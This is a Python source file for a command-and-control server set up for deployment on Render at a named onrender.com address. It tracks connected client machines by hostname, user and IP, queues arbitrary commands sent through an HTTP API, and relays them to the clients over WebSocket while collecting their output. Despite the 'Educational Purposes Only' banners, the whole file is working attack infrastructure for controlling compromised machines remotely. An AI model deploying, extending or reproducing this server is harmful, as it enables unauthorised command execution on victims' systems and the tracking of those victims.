#!/usr/bin/env python3
"""
C2 SERVER FOR RENDER DEPLOYMENT
Run on: https://c2-server-zz0i.onrender.com
Educational Purposes Only
"""

import asyncio
import websockets
import json
import hashlib
import time
from datetime import datetime
import os
import ssl
from typing import Dict, Set
import aiohttp
from aiohttp import web
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class RenderC2Server:
    def __init__(self):
        self.clients: Dict[str, Dict] = {}
        self.sessions: Dict[str, websockets.WebSocketServerProtocol] = {}
        self.command_queue: Dict[str, list] = {}
        self.running = True
        
        # Render config
        self.host = "0.0.0.0"
        self.port = int(os.environ.get("PORT", 443))
        self.server_url = os.environ.get("RENDER_URL", "wss://c2-server-zz0i.onrender.com")
        
        # Web interface
        self.web_app = web.Application()
        self.setup_routes()
        
        logger.info(f"Render C2 Server initialized on port {self.port}")
    
    def setup_routes(self):
        """Setup HTTP routes"""
        self.web_app.router.add_get('/', self.handle_root)
        self.web_app.router.add_get('/health', self.handle_health)
        self.web_app.router.add_get('/clients', self.handle_clients_api)
        self.web_app.router.add_post('/command', self.handle_command_api)
    
    async def handle_root(self, request):
        """Root endpoint"""
        return web.Response(text="C2 Server Online - Educational Use Only\nUse WebSocket: wss://c2-server-zz0i.onrender.com")
    
    async def handle_health(self, request):
        """Health check for Render"""
        return web.json_response({"status": "ok", "clients": len(self.clients)})
    
    async def handle_clients_api(self, request):
        """API to get client list"""
        clients_data = []
        for client_id, client in self.clients.items():
            clients_data.append({
                'id': client_id,
                'online': client.get('online', False),
                'hostname': client.get('hostname', 'Unknown'),
                'os': client.get('os', 'Unknown'),
                'ip': client.get('ip', 'Unknown'),
                'last_seen': client.get('last_seen', 0)
            })
        return web.json_response(clients_data)
    
    async def handle_command_api(self, request):
        """API to send commands"""
        try:
            data = await request.json()
            client_id = data.get('client_id')
            command = data.get('command')
            
            if not client_id or not command:
                return web.json_response({"error": "Missing parameters"}, status=400)
            
            if client_id not in self.command_queue:
                self.command_queue[client_id] = []
            
            self.command_queue[client_id].append({
                'command': command,
                'timestamp': time.time()
            })
            
            return web.json_response({"status": "queued"})
        except:
            return web.json_response({"error": "Invalid request"}, status=400)
    
    def generate_client_id(self, info: dict) -> str:
        """Generate unique client ID"""
        unique = f"{info.get('hostname', '')}{info.get('os', '')}{info.get('username', '')}"
        return hashlib.md5(unique.encode()).hexdigest()[:8]
    
    async def handle_client(self, websocket, path):
        """Handle client WebSocket connections"""
        client_id = None
        client_ip = websocket.remote_address[0]
        
        try:
            # Get client info
            data = await websocket.recv()
            client_info = json.loads(data)
            
            # Generate ID
            client_id = client_info.get('id') or self.generate_client_id(client_info)
            
            # Store client
            self.clients[client_id] = {
                'socket': websocket,
                'hostname': client_info.get('hostname', 'Unknown'),
                'os': client_info.get('os', 'Unknown'),
                'username': client_info.get('username', 'Unknown'),
                'ip': client_ip,
                'last_seen': time.time(),
                'online': True,
                'first_seen': time.time()
            }
            
            self.sessions[client_id] = websocket
            
            logger.info(f"New client: {client_id} - {client_info.get('hostname')}")
            
            # Send welcome
            await websocket.send(json.dumps({
                'type': 'welcome',
                'id': client_id,
                'server': self.server_url
            }))
            
            # Main loop
            while self.running:
                try:
                    # Check for commands
                    if client_id in self.command_queue and self.command_queue[client_id]:
                        cmd = self.command_queue[client_id].pop(0)
                        
                        # Send command
                        await websocket.send(json.dumps({
                            'type': 'command',
                            'command': cmd['command'],
                            'timestamp': cmd['timestamp']
                        }))
                        
                        # Wait for response
                        response = await asyncio.wait_for(websocket.recv(), timeout=30)
                        response_data = json.loads(response)
                        
                        logger.info(f"Command executed on {client_id}: {cmd['command'][:50]}...")
                        
                    else:
                        # Heartbeat
                        await websocket.send(json.dumps({'type': 'ping', 'time': time.time()}))
                        
                        # Wait for pong
                        try:
                            await asyncio.wait_for(websocket.recv(), timeout=10)
                        except asyncio.TimeoutError:
                            pass
                        
                        # Update last seen
                        self.clients[client_id]['last_seen'] = time.time()
                        
                        await asyncio.sleep(5)
                        
                except websockets.ConnectionClosed:
                    break
                except Exception as e:
                    logger.error(f"Client loop error: {e}")
                    break
                    
        except Exception as e:
            logger.error(f"Connection error: {e}")
        finally:
            if client_id:
                if client_id in self.sessions:
                    del self.sessions[client_id]
                if client_id in self.clients:
                    self.clients[client_id]['online'] = False
                logger.info(f"Client disconnected: {client_id}")
    
    async def cleanup_task(self):
        """Cleanup stale clients"""
        while self.running:
            await asyncio.sleep(300)
            
            current_time = time.time()
            stale = []
            
            for client_id, client in list(self.clients.items()):
                if current_time - client.get('last_seen', 0) > 600:  # 10 minutes
                    stale.append(client_id)
            
            for client_id in stale:
                if client_id in self.clients:
                    del self.clients[client_id]
                if client_id in self.command_queue:
                    del self.command_queue[client_id]
                
                logger.info(f"Cleaned up stale client: {client_id}")
    
    async def start(self):
        """Start the server"""
        # SSL context for Render
        ssl_context = None
        if os.environ.get("RENDER"):
            # Render provides SSL automatically
            ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        
        # Start WebSocket server
        ws_server = await websockets.serve(
            self.handle_client,
            self.host,
            self.port,
            ssl=ssl_context,
            ping_interval=20,
            ping_timeout=40
        )
        
        # Start HTTP server
        runner = web.AppRunner(self.web_app)
        await runner.setup()
        site = web.TCPSite(runner, self.host, 10000)  # Render expects port 10000 for HTTP
        await site.start()
        
        # Start cleanup task
        asyncio.create_task(self.cleanup_task())
        
        logger.info(f"Server started on {self.host}:{self.port}")
        logger.info(f"WebSocket URL: {self.server_url}")
        logger.info(f"HTTP API on port 10000")
        
        # Keep running
        await asyncio.Future()

async def main():
    server = RenderC2Server()
    await server.start()

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════╗
    ║     RENDER C2 SERVER                 ║
    ║    https://c2-server-zz0i.onrender.com ║
    ║    Educational Purposes Only         ║
    ╚══════════════════════════════════════╝
    """)
    
    asyncio.run(main())
